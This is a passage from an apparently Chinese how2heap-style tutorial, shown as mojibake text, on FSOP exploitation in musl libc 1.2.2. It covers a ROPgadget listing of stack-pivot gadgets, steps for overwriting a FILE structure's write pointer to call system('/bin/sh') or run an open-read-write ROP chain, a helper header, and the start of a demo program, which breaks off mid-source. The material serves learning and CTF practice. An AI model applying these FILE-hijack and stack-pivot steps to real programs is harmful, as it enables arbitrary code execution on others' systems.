<p>å¯ä»¥çœ‹åˆ°<code>close_file</code>ä¸­å¯èƒ½ä¼šè°ƒç”¨ä¸‰ä¸ª<code>FILE</code>çš„<code>write</code>å’Œ<code>seek</code>å‡½æ•°æŒ‡é’ˆã€‚æˆ‘ä»¬è¦ä¿®æ”¹çš„ä¹Ÿæ­£æ˜¯è¿™ä¸¤ä¸ªæŒ‡é’ˆã€‚åœ¨æ²¡æœ‰æ²™ç®±çš„æƒ…å†µä¸‹ï¼Œåªéœ€è¦å°†<code>FILE</code>ç»“æ„ä½“å¼€å¤´çš„å‡ ä¸ªå­—èŠ‚ä¿®æ”¹ä¸º<code>/bin/sh</code>ï¼Œå†ä¿®æ”¹<code>write</code>æŒ‡é’ˆçš„å€¼ä¸º<code>system</code>ï¼Œä»¥åŠä¿®æ”¹<code>f-&gt;wpos</code>ã€<code>f-&gt;wbase</code>ä¸­å…¶ä¸­ä¹‹ä¸€å°±å¯ä»¥è°ƒç”¨åˆ°<code>system(&quot;/bin/sh&quot;)</code>ã€‚è€Œåœ¨æœ‰æ²™ç®±ä¿æŠ¤çš„æƒ…å†µä¸‹ï¼Œè¿˜éœ€è¦é€šè¿‡æ ˆè¿ç§»æ‰èƒ½è¿›è¡Œorwã€‚</p>
<p>ç”±äºè°ƒç”¨<code>close_file</code>æ—¶ï¼Œ<code>rsp</code>å‘¨å›´çš„æ ˆç¯å¢ƒä¸å—æˆ‘ä»¬æ§åˆ¶ï¼Œå› æ­¤æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨å¸¦æœ‰<code>pop rsp</code>çš„gadgetã€‚ä»¥ä¸‹æ˜¯æŸ¥æ‰¾å¸¦æœ‰<code>mov rsp, xxx</code>çš„gadgetï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@colin-virtual-machine:~/Desktop/my_how2heap/musl# ROPgadget --binary /lib/x86_64-linux-musl/libc.so | grep &quot;mov rsp&quot;</span><br><span class="line">0x0000000000076b32 : add byte ptr [rax], al ; sub rdx, 8 ; mov rsp, rdx ; jmp rax</span><br><span class="line">0x0000000000022c22 : add dword ptr [rax], eax ; mov rsp, qword ptr [rbp - 0xc0] ; jmp 0x22750</span><br><span class="line">0x000000000007571b : add eax, dword ptr [rax] ; mov rsp, qword ptr [rbp - 0x448] ; jmp 0x75096</span><br><span class="line">0x000000000004d278 : je 0x4d183 ; mov rsp, r9 ; jmp 0x4d101</span><br><span class="line">0x00000000000789f3 : jg 0x78a1d ; mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]</span><br><span class="line">0x0000000000022c0a : jne 0x22bf0 ; mov rsp, qword ptr [rbp - 0xc0] ; jmp 0x227e2</span><br><span class="line">0x000000000004d259 : lea ebx, [rax + 1] ; mov rsp, r9 ; jmp 0x4d101</span><br><span class="line">0x000000000004d258 : lea r11, [rax + 1] ; mov rsp, r9 ; jmp 0x4d101</span><br><span class="line">0x000000000004d247 : mov eax, 0xffffffff ; mov rsp, r9 ; jmp 0x4d199</span><br><span class="line">0x00000000000789f2 : mov edi, dword ptr [rdi + 0x28] ; mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]</span><br><span class="line">0x00000000000789f1 : mov r15, qword ptr [rdi + 0x28] ; mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]</span><br><span class="line">0x000000000007571d : mov rsp, qword ptr [rbp - 0x448] ; jmp 0x75096</span><br><span class="line">0x0000000000022c24 : mov rsp, qword ptr [rbp - 0xc0] ; jmp 0x22750</span><br><span class="line">0x0000000000022c0c : mov rsp, qword ptr [rbp - 0xc0] ; jmp 0x227e2</span><br><span class="line">0x00000000000789f5 : mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]</span><br><span class="line">0x000000000004d25c : mov rsp, r9 ; jmp 0x4d101</span><br><span class="line">0x000000000004d24c : mov rsp, r9 ; jmp 0x4d199</span><br><span class="line">0x0000000000076b38 : mov rsp, rdx ; jmp rax</span><br><span class="line">0x000000000004d246 : sub byte ptr [rax - 1], bh ; mov rsp, r9 ; jmp 0x4d199</span><br><span class="line">0x0000000000076b35 : sub edx, 8 ; mov rsp, rdx ; jmp rax</span><br><span class="line">0x0000000000076b34 : sub rdx, 8 ; mov rsp, rdx ; jmp rax</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­æ³¨æ„åˆ°<code>mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]</code>ï¼Œç”±äº<code>write</code>å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯<code>FILE</code>ç»“æ„ä½“è‡ªèº«ï¼Œå› æ­¤è¿™é‡Œçš„<code>[rdi+0x30]</code>æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡æå‰ä¿®æ”¹æ§åˆ¶çš„å€¼ï¼Œè¿™æ ·å°±èƒ½å¤Ÿæ§åˆ¶<code>rsp</code>çš„å€¼ã€‚åŒæ ·ï¼Œåé¢çš„<code>[rdi+0x38]</code>å¯ä»¥å†™å…¥ROPé“¾å¼€å¤´çš„ä¸€ä¸ªgadgetçš„åœ°å€ï¼Œä»è€Œå¼€å§‹æ‰§è¡ŒROPé“¾ã€‚è¿™é‡Œæ³¨æ„åˆ°<code>[rdi+0x38]</code>å½“<code>rdi</code>ç­‰äº<code>FILE</code>ç»“æ„ä½“åœ°å€æ—¶ï¼Œ0x38çš„åç§»å¯¹åº”çš„æ­£å¥½å°±æ˜¯<code>wbase</code>ï¼Œè¿™æ ·å¯ä»¥åœ¨æ»¡è¶³åˆ¤æ–­æ¡ä»¶çš„åŒæ—¶å†™å…¥gadgetåœ°å€ï¼Œä¸€ä¸¾ä¸¤å¾—ã€‚</p>
<p>æ€»ç»“ï¼š</p>
<ul>
<li>åœ¨æ— æ²™ç®±æ—¶ï¼Œéœ€è¦ä¿®æ”¹<code>FILE</code>ç»“æ„ä½“çš„3ä¸ªåœ°æ–¹â€”â€”
<ul>
<li>èµ·å§‹ä½ç½®å†™å…¥<code>/bin/sh</code></li>
<li><code>f-&gt;wpos</code>ã€<code>f-&gt;wbase</code>ä¸­å…¶ä¸­ä¹‹ä¸€ä½¿å¾—äºŒè€…ä¸ç­‰</li>
<li><code>write</code>å†™å…¥<code>system</code>å‡½æ•°åœ°å€ã€‚</li>
</ul>
</li>
<li>åœ¨æœ‰æ²™ç®±æ—¶ï¼Œéœ€è¦ä¿®æ”¹<code>FILE</code>ç»“æ„ä½“çš„3ä¸ªåœ°æ–¹â€”â€”
<ul>
<li><code>f-&gt;wbase</code>å†™å…¥ç¬¬ä¸€ä¸ªgadgetåœ°å€ä½¿å¾—<code>f-&gt;wpos</code>ã€<code>f-&gt;wbase</code>ä¸ç­‰çš„åŒæ—¶èƒ½å¤Ÿæ‰§è¡Œåˆ°gadget</li>
<li><code>write</code>å†™å…¥åˆšæ‰æåˆ°çš„æ ˆè¿ç§»çš„gadget</li>
<li>åç§»0x30å¤„å†™å…¥æ–°çš„æ ˆåœ°å€é…åˆæ ˆè¿ç§»gadgetå®Œæˆæ ˆè¿ç§»</li>
<li>æ­¤å¤–è¿˜éœ€è¦åœ¨å…¶ä»–åœ°æ–¹æ„é€ å¥½ROPé“¾ç”¨äºorw</li>
</ul>
</li>
</ul>
<p>ä¸‹é¢ç¬”è€…ç¼–å†™çš„demoç¨‹åºè¯¦ç»†æ¼”ç¤ºäº†ä¸¤ç§åˆ©ç”¨æ–¹å¼çš„æµç¨‹ï¼Œä¸ºæ–¹ä¾¿èµ·è§ï¼Œdemoä¸­æ²¡æœ‰é€šè¿‡unlinkè¿›è¡Œåœ°å€å†™æ“ä½œï¼Œè€Œæ˜¯ç›´æ¥å†™ã€‚å¦‚æœä½¿ç”¨unlinkè¿›è¡Œä»»æ„åœ°å€å†™ï¼Œè¦æ³¨æ„åç§»é‡ï¼Œä¸¤ä¸ªåœ°å€aå’Œbä¸­å¦‚æœaèƒ½å¤Ÿå†™åˆ°bçš„ä½ç½®ï¼Œé‚£ä¹ˆbä¼šå†™åˆ°a+8çš„ä½ç½®ï¼Œå¯¹åº”äºä¸¤ä¸ªæŒ‡é’ˆåœ¨ç»“æ„ä½“ä¸­çš„åç§»ï¼Œè¿™ä¸€ç‚¹åœ¨ä¸Šä¸€ç¯‡æ–‡ç« ä¸­æœ€åæ‰“å°ç»“æœæ—¶æœ‰ä½“ç°ï¼Œä¸è¦å¿½è§†ã€‚</p>
<p>å¦‚æœæ‰§è¡Œä¸æˆåŠŸï¼Œè¯·æ£€æŸ¥è‡ªå·±æœºå™¨ä¸Šçš„musl libcç‰ˆæœ¬æ˜¯å¦æ˜¯1.2.2ï¼Œè‹¥ä¸æ˜¯ï¼Œåˆ™æ ¹æ®åæ±‡ç¼–ç»“æœè¿›è¡Œåç§»é‡çš„è°ƒæ•´å³å¯ã€‚ï¼ˆé€‰æ‹©orwæ¨¡å¼æ—¶éœ€ç¡®ä¿å½“å‰æ–‡ä»¶å¤¹ä¸­æœ‰flagæ–‡ä»¶ï¼‰</p>
<p>å¤´æ–‡ä»¶<code>musl_util.h</code>ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MY_HOW2HEAP_MUSL_UTIL_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MY_HOW2HEAP_MUSL_UTIL_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *rpos, *rend;</span><br><span class="line">    <span class="type">int</span> (*close)(FILE *);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *wend, *wpos;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *mustbezero_1;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *wbase;</span><br><span class="line">    <span class="type">size_t</span> (*read)(FILE *, <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line">    <span class="type">size_t</span> (*write)(FILE *, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line">    <span class="type">off_t</span> (*seek)(FILE *, <span class="type">off_t</span>, <span class="type">int</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *buf;</span><br><span class="line">    <span class="type">size_t</span> buf_size;</span><br><span class="line">    FILE *prev, *next;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">int</span> pipe_pid;</span><br><span class="line">    <span class="type">long</span> lockcount;</span><br><span class="line">    <span class="type">int</span> mode;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> lock;</span><br><span class="line">    <span class="type">int</span> lbf;</span><br><span class="line">    <span class="type">void</span> *cookie;</span><br><span class="line">    <span class="type">off_t</span> off;</span><br><span class="line">    <span class="type">char</span> *getln_buf;</span><br><span class="line">    <span class="type">void</span> *mustbezero_2;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *shend;</span><br><span class="line">    <span class="type">off_t</span> shlim, shcnt;</span><br><span class="line">    FILE *prev_locked, *next_locked;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">locale_struct</span> *<span class="title">locale</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> avail_mask, freed_mask;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> last_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> freeable:<span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> sizeclass:<span class="number">6</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> maplen:<span class="number">8</span>*<span class="number">8</span><span class="number">-12</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> active_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="type">char</span> pad[<span class="number">0x10</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> storage[];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> check;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">int</span> nslots;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLACK       <span class="string">&quot;30&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RED         <span class="string">&quot;31&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN       <span class="string">&quot;32&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> YELLOW      <span class="string">&quot;33&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLUE        <span class="string">&quot;34&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PURPLE      <span class="string">&quot;35&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN_DARK  <span class="string">&quot;36&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WHITE       <span class="string">&quot;37&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNDEFINED   <span class="string">&quot;-&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHLIGHT   <span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNDERLINE   <span class="string">&quot;4&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SPARK       <span class="string">&quot;5&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STR_END      <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">printf_color</span><span class="params">(<span class="type">char</span>* color, <span class="type">char</span>* effect, <span class="type">char</span>* <span class="built_in">string</span>)</span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, <span class="string">&quot;\033[&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(effect[<span class="number">0</span>] != <span class="string">&#x27;-&#x27;</span>)&#123;</span><br><span class="line">        <span class="built_in">strcat</span>(buffer, effect);</span><br><span class="line">        <span class="built_in">strcat</span>(buffer, <span class="string">&quot;;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, color);</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, <span class="string">&quot;m&quot;</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, <span class="built_in">string</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span> STR_END, buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Address info starting in %p:\n&quot;</span>, buf);</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line">        <span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line">        <span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line">        <span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">        output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line">        <span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">        index += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">//MY_HOW2HEAP_MUSL_UTIL_H</span></span></span><br></pre></td></tr></table></figure>
<p>cæ–‡ä»¶<code>musl_FSOP.c</code>ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;musl_util.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> get_shell 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> orw 2</span></span><br><span class="line"><span class="comment">// é‡è¦ï¼åœ¨è¿™é‡Œä¿®æ”¹åˆ©ç”¨æ¨¡å¼</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mode orw</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* flag = <span class="string">&quot;./flag&quot;</span>;</span><br><span class="line"><span class="type">char</span>* bin_sh = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"><span class="type">size_t</span> enough_space[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">size_t</span> fake_stack[<span class="number">0x40</span>];</span><br><span class="line"><span class="type">char</span> flag_content[<span class="number">0x20</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;æœ¬ç¨‹åºç”¨äºæ¼”ç¤ºmusl libcçš„FSOPåˆ©ç”¨æ–¹å¼ã€‚\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;æµ‹è¯•ç¯å¢ƒï¼šubuntu 